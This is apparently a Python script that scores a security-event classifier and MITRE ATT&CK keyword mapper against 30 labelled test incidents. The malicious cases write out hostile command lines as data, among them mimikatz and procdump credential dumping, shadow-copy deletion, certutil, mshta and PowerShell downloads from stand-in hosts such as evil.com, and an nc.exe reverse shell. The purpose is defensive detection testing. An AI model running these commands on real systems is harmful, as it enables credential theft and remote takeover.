"""
Agent Evaluation Script

Evaluates the ML+MITRE pipeline on a ground-truth test set of 30 labeled incidents.
No LLM is required - uses ML classification + MITRE mapping only.

Each test case has:
  - events: list of security events
  - expected_label: 0 (benign) or 1 (malicious)
  - expected_techniques: list of MITRE technique IDs (optional)
  - description: human-readable description

Metrics:
  - Incident-level precision, recall, F1
  - MITRE technique detection rate
  - False positive rate

Usage:
  python scripts/evaluate_agent.py
  python scripts/evaluate_agent.py --output reports/agent_evaluation.json
"""
from __future__ import annotations

import argparse
import json
import pickle
import sys
from pathlib import Path
from typing import List, Dict, Any

import numpy as np

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

MODEL_PATH = ROOT / "models" / "gradient_boosting_production.pkl"


# --------------------------------------------------------------------------- #
# Ground Truth Test Cases
# --------------------------------------------------------------------------- #

TEST_CASES = [
    # ---- MALICIOUS ----
    {
        "id": "TC-001",
        "description": "Mimikatz credential dumping",
        "expected_label": 1,
        "expected_techniques": ["T1003"],
        "events": [
            {"event_id": 1, "process_name": "C:\\Users\\attacker\\mimikatz.exe",
             "command_line": "mimikatz.exe sekurlsa::logonpasswords exit", "parent_image": "cmd.exe"},
        ],
    },
    {
        "id": "TC-002",
        "description": "PowerShell encoded command download and execute",
        "expected_label": 1,
        "expected_techniques": ["T1059.001"],
        "events": [
            {"event_id": 4688, "process_name": "powershell.exe",
             "command_line": "powershell.exe -enc JAB1AHIAbAAgAD0AIAAnaHR0cHMAOi8vZXZpbC5leGUn",
             "parent_image": "cmd.exe"},
        ],
    },
    {
        "id": "TC-003",
        "description": "Ransomware: vssadmin shadow delete",
        "expected_label": 1,
        "expected_techniques": ["T1490"],
        "events": [
            {"event_id": 4688, "process_name": "cmd.exe",
             "command_line": "cmd.exe /c vssadmin delete shadows /all /quiet"},
            {"event_id": 4688, "process_name": "bcdedit.exe",
             "command_line": "bcdedit /set {default} recoveryenabled no"},
        ],
    },
    {
        "id": "TC-004",
        "description": "PsExec lateral movement",
        "expected_label": 1,
        "expected_techniques": ["T1021"],
        "events": [
            {"event_id": 1, "process_name": "C:\\Windows\\psexec.exe",
             "command_line": "psexec \\\\192.168.1.50 -u admin -p Password1 cmd.exe"},
        ],
    },
    {
        "id": "TC-005",
        "description": "Certutil download",
        "expected_label": 1,
        "expected_techniques": ["T1105"],
        "events": [
            {"event_id": 4688, "process_name": "certutil.exe",
             "command_line": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe"},
        ],
    },
    {
        "id": "TC-006",
        "description": "Scheduled task persistence",
        "expected_label": 1,
        "expected_techniques": ["T1053"],
        "events": [
            {"event_id": 4688, "process_name": "schtasks.exe",
             "command_line": "schtasks /create /tn \"Updater\" /tr C:\\Temp\\malware.exe /sc onlogon /ru system"},
        ],
    },
    {
        "id": "TC-007",
        "description": "LSASS memory access (process injection)",
        "expected_label": 1,
        "expected_techniques": ["T1003"],
        "events": [
            {"event_id": 10, "process_name": "C:\\Temp\\injector.exe",
             "command_line": "injector.exe --target lsass"},
        ],
    },
    {
        "id": "TC-008",
        "description": "MSHTA executing remote script",
        "expected_label": 1,
        "expected_techniques": ["T1218"],
        "events": [
            {"event_id": 1, "process_name": "mshta.exe",
             "command_line": "mshta.exe http://malicious.com/payload.hta"},
        ],
    },
    {
        "id": "TC-009",
        "description": "Regsvr32 COM scriptlet execution",
        "expected_label": 1,
        "expected_techniques": ["T1218"],
        "events": [
            {"event_id": 1, "process_name": "regsvr32.exe",
             "command_line": "regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll"},
        ],
    },
    {
        "id": "TC-010",
        "description": "Procdump LSASS dump",
        "expected_label": 1,
        "expected_techniques": ["T1003"],
        "events": [
            {"event_id": 1, "process_name": "procdump.exe",
             "command_line": "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp"},
        ],
    },
    {
        "id": "TC-011",
        "description": "WMI remote code execution",
        "expected_label": 1,
        "expected_techniques": ["T1047"],
        "events": [
            {"event_id": 4688, "process_name": "wmic.exe",
             "command_line": "wmic /node:192.168.1.100 process call create \"cmd.exe /c whoami\""},
        ],
    },
    {
        "id": "TC-012",
        "description": "Malicious DLL load from temp",
        "expected_label": 1,
        "expected_techniques": [],
        "events": [
            {"event_id": 7, "process_name": "C:\\Temp\\malware.exe",
             "hashes": "SHA256=abc123def456"},
        ],
    },
    {
        "id": "TC-013",
        "description": "Reverse shell via nc.exe",
        "expected_label": 1,
        "expected_techniques": ["T1059"],
        "events": [
            {"event_id": 1, "process_name": "nc.exe",
             "command_line": "nc.exe -e cmd.exe 10.0.0.1 4444",
             "destination_ip": "10.0.0.1", "destination_port": 4444},
        ],
    },
    {
        "id": "TC-014",
        "description": "New local admin account",
        "expected_label": 1,
        "expected_techniques": ["T1136"],
        "events": [
            {"event_id": 4688, "process_name": "net.exe",
             "command_line": "net user hacker P@ssw0rd /add"},
            {"event_id": 4688, "process_name": "net.exe",
             "command_line": "net localgroup administrators hacker /add"},
        ],
    },
    {
        "id": "TC-015",
        "description": "Base64 PowerShell download cradle",
        "expected_label": 1,
        "expected_techniques": ["T1059.001"],
        "events": [
            {"event_id": 4104, "process_name": "powershell.exe",
             "command_line": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"},
        ],
    },

    # ---- BENIGN ----
    {
        "id": "TC-016",
        "description": "Normal user login",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 4624, "process_name": "", "command_line": "",
             "user": "john.doe", "logon_type": 2, "hostname": "WS-USER01"},
        ],
    },
    {
        "id": "TC-017",
        "description": "Chrome browser process",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 1, "process_name": "C:\\Program Files\\Google\\Chrome\\chrome.exe",
             "command_line": "chrome.exe https://google.com", "parent_image": "explorer.exe"},
        ],
    },
    {
        "id": "TC-018",
        "description": "Windows Update service",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 5, "process_name": "C:\\Windows\\System32\\svchost.exe",
             "command_line": "", "user": "SYSTEM"},
        ],
    },
    {
        "id": "TC-019",
        "description": "Word document opened",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 1, "process_name": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
             "command_line": "WINWORD.EXE report.docx", "parent_image": "explorer.exe"},
        ],
    },
    {
        "id": "TC-020",
        "description": "Python developer script",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 1, "process_name": "python.exe",
             "command_line": "python.exe manage.py runserver", "parent_image": "code.exe"},
        ],
    },
    {
        "id": "TC-021",
        "description": "Git pull operation",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 1, "process_name": "git.exe",
             "command_line": "git pull origin main", "parent_image": "code.exe"},
        ],
    },
    {
        "id": "TC-022",
        "description": "antivirus scan process",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 7, "process_name": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
             "hashes": "SHA256=1234abcd", "command_line": ""},
        ],
    },
    {
        "id": "TC-023",
        "description": "Normal network connection to internal server",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 3, "process_name": "C:\\Windows\\System32\\svchost.exe",
             "destination_ip": "192.168.1.10", "destination_port": 443},
        ],
    },
    {
        "id": "TC-024",
        "description": "Registry read by explorer",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 12, "process_name": "C:\\Windows\\explorer.exe",
             "command_line": ""},
        ],
    },
    {
        "id": "TC-025",
        "description": "Scheduled task Windows Defender update (legitimate)",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 4688, "process_name": "C:\\Windows\\System32\\schtasks.exe",
             "command_line": "schtasks.exe /run /tn \"Windows Defender Cache Maintenance\""},
        ],
    },
    # ---- EDGE CASES ----
    {
        "id": "TC-026",
        "description": "PowerShell admin script (benign admin task)",
        "expected_label": 0,
        "expected_techniques": [],
        "events": [
            {"event_id": 1, "process_name": "powershell.exe",
             "command_line": "powershell.exe Get-Service | Where-Object {$_.Status -eq 'Running'}",
             "parent_image": "explorer.exe"},
        ],
    },
    {
        "id": "TC-027",
        "description": "Cobalt Strike beacon network activity",
        "expected_label": 1,
        "expected_techniques": ["T1071"],
        "events": [
            {"event_id": 3, "process_name": "C:\\Windows\\System32\\svchost.exe",
             "destination_ip": "185.220.101.45", "destination_port": 443,
             "command_line": "cobalt beacon active"},
        ],
    },
    {
        "id": "TC-028",
        "description": "Empire framework agent",
        "expected_label": 1,
        "expected_techniques": ["T1059.001"],
        "events": [
            {"event_id": 4104, "process_name": "powershell.exe",
             "command_line": "powershell.exe -nop -w hidden -c empire agent stage2"},
        ],
    },
    {
        "id": "TC-029",
        "description": "Multi-stage attack: recon + lateral + credential",
        "expected_label": 1,
        "expected_techniques": ["T1082", "T1021", "T1003"],
        "events": [
            {"event_id": 4688, "process_name": "whoami.exe", "command_line": "whoami /priv"},
            {"event_id": 4688, "process_name": "net.exe", "command_line": "net view /domain"},
            {"event_id": 1, "process_name": "psexec.exe",
             "command_line": "psexec \\\\DC01 -u admin cmd.exe"},
            {"event_id": 10, "process_name": "C:\\Temp\\x.exe", "command_line": "x.exe -dump lsass"},
        ],
    },
    {
        "id": "TC-030",
        "description": "Windows Defender exclusion via PowerShell",
        "expected_label": 1,
        "expected_techniques": ["T1562"],
        "events": [
            {"event_id": 1, "process_name": "powershell.exe",
             "command_line": "powershell.exe -c Add-MpPreference -ExclusionPath C:\\Temp\\malware.exe -Force"},
        ],
    },
]


# --------------------------------------------------------------------------- #
# Prediction using ML model
# --------------------------------------------------------------------------- #

def predict_incident(events: List[Dict[str, Any]], model, scaler, threshold: float) -> float:
    """Returns max malicious probability across all events in the incident."""
    from scripts.retrain_source_split import extract_features_v3
    X = np.array([extract_features_v3(e) for e in events], dtype=np.float32)
    X_s = scaler.transform(X)
    probs = model.predict_proba(X_s)[:, 1]
    return float(np.max(probs))


def predict_with_mitre(events: List[Dict[str, Any]], model, scaler, threshold: float):
    """Returns (probability, detected_techniques)."""
    prob = predict_incident(events, model, scaler, threshold)

    # MITRE pattern matching
    detected = set()
    for event in events:
        text = (str(event.get('command_line', '') or '') + ' ' +
                str(event.get('process_name', '') or '')).lower()
        eid = int(event.get('event_id', 0) or 0)

        if any(k in text for k in ['lsass', 'procdump', 'sekurlsa', 'comsvcs', 'mimikatz']):
            detected.add('T1003')
        if any(k in text for k in ['-enc', 'frombase64', 'iex(', 'downloadstring']) or eid == 4104:
            detected.add('T1059.001')
        if any(k in text for k in ['vssadmin delete', 'bcdedit']):
            detected.add('T1490')
        if any(k in text for k in ['psexec', 'winrs']):
            detected.add('T1021')
        if any(k in text for k in ['certutil', 'bitsadmin']):
            detected.add('T1105')
        if any(k in text for k in ['schtasks /create', 'new-scheduledtask']):
            detected.add('T1053')
        if any(k in text for k in ['mshta', 'regsvr32', 'installutil', 'msbuild']):
            detected.add('T1218')
        if any(k in text for k in ['wmic process', 'wmic /node']):
            detected.add('T1047')
        if any(k in text for k in ['net user', 'net localgroup']):
            detected.add('T1136')
        if any(k in text for k in ['cobalt', 'beacon']):
            detected.add('T1071')
        if any(k in text for k in ['add-mppreference', 'exclusionpath']):
            detected.add('T1562')
        if any(k in text for k in ['whoami', 'systeminfo']):
            detected.add('T1082')

        if eid in (8, 10):
            detected.add('T1003')

    return prob, list(detected)


def section(title: str):
    print(f"\n{'='*60}\n  {title}\n{'='*60}")


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", default="reports/agent_evaluation.json")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    section("Loading ML Model")
    if not MODEL_PATH.exists():
        print(f"  ERROR: {MODEL_PATH} not found!")
        sys.exit(1)

    with open(MODEL_PATH, "rb") as f:
        payload = pickle.load(f)

    model = payload["model"]
    scaler = payload["scaler"]
    threshold = payload.get("threshold", 0.60)
    print(f"  Threshold: {threshold}")
    print(f"  Test cases: {len(TEST_CASES)}")

    malicious_cases = [tc for tc in TEST_CASES if tc["expected_label"] == 1]
    benign_cases = [tc for tc in TEST_CASES if tc["expected_label"] == 0]
    print(f"  Malicious: {len(malicious_cases)}, Benign: {len(benign_cases)}")

    section("Running Evaluation")

    all_results = []
    tp = fp = tn = fn = 0
    technique_hits = 0
    technique_total = 0

    for tc in TEST_CASES:
        prob, detected_techniques = predict_with_mitre(
            tc["events"], model, scaler, threshold
        )
        predicted_label = 1 if prob >= threshold else 0
        correct = predicted_label == tc["expected_label"]

        # Confusion matrix
        if tc["expected_label"] == 1 and predicted_label == 1:
            tp += 1
        elif tc["expected_label"] == 0 and predicted_label == 1:
            fp += 1
        elif tc["expected_label"] == 0 and predicted_label == 0:
            tn += 1
        else:
            fn += 1

        # MITRE technique detection
        expected_techs = set(tc["expected_techniques"])
        if expected_techs:
            technique_total += len(expected_techs)
            hits = len(expected_techs & set(detected_techniques))
            technique_hits += hits

        status = "OK" if correct else "WRONG"
        result = {
            "id": tc["id"],
            "description": tc["description"],
            "expected_label": tc["expected_label"],
            "predicted_label": predicted_label,
            "confidence": round(prob, 4),
            "correct": correct,
            "expected_techniques": tc["expected_techniques"],
            "detected_techniques": detected_techniques,
        }
        all_results.append(result)

        if args.verbose or not correct:
            label_str = "malicious" if predicted_label == 1 else "benign"
            exp_str = "malicious" if tc["expected_label"] == 1 else "benign"
            print(f"  [{status}] {tc['id']}: {tc['description'][:45]}")
            print(f"         Expected={exp_str} | Predicted={label_str} (conf={prob:.3f})")
            if detected_techniques:
                print(f"         MITRE: {detected_techniques}")

    # ------------------------------------------------------------------ #
    # Metrics
    # ------------------------------------------------------------------ #
    section("Results")

    total = len(TEST_CASES)
    accuracy = (tp + tn) / total
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0
    fnr = fn / (fn + tp) if (fn + tp) > 0 else 0
    technique_recall = technique_hits / technique_total if technique_total > 0 else 0

    print(f"""
  Test cases: {total}  (malicious={len(malicious_cases)}, benign={len(benign_cases)})

  Incident-level metrics:
  -------------------------------------------------
  Accuracy:           {accuracy:.4f}  ({tp+tn}/{total} correct)
  Precision:          {precision:.4f}
  Recall:             {recall:.4f}
  F1-Score:           {f1:.4f}
  FPR:                {fpr*100:.1f}%  ({fp} benign misclassified as malicious)
  FNR:                {fnr*100:.1f}%  ({fn} attacks missed)

  Confusion matrix:
  -------------------------------------------------
  True Positives:     {tp}  (detected real attacks)
  True Negatives:     {tn}  (correctly flagged benign)
  False Positives:    {fp}  (benign flagged as attack)
  False Negatives:    {fn}  (missed attacks)

  MITRE technique detection:
  -------------------------------------------------
  Techniques hit:     {technique_hits}/{technique_total}
  Technique recall:   {technique_recall:.4f}
""")

    # Full detail table
    print(f"  {'ID':<8} {'Description':<45} {'Expected':<10} {'Predicted':<10} {'Conf':>6} {'OK':>4}")
    print(f"  {'-'*90}")
    for r in all_results:
        exp_str = "malicious" if r["expected_label"] == 1 else "benign"
        pred_str = "malicious" if r["predicted_label"] == 1 else "benign"
        ok_str = "OK" if r["correct"] else "WRONG"
        print(f"  {r['id']:<8} {r['description'][:45]:<45} {exp_str:<10} {pred_str:<10} {r['confidence']:>6.3f} {ok_str:>4}")

    # ------------------------------------------------------------------ #
    # Save
    # ------------------------------------------------------------------ #
    summary = {
        "total_cases": total,
        "malicious_cases": len(malicious_cases),
        "benign_cases": len(benign_cases),
        "metrics": {
            "accuracy": round(accuracy, 4),
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "f1": round(f1, 4),
            "fpr": round(fpr, 4),
            "fnr": round(fnr, 4),
            "technique_recall": round(technique_recall, 4),
        },
        "confusion_matrix": {"tp": tp, "fp": fp, "tn": tn, "fn": fn},
        "results": all_results,
    }

    output_path = ROOT / args.output
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(summary, f, ensure_ascii=False, indent=2)
    print(f"\n  Saved to: {output_path}")

    section("DONE")


if __name__ == "__main__":
    main()
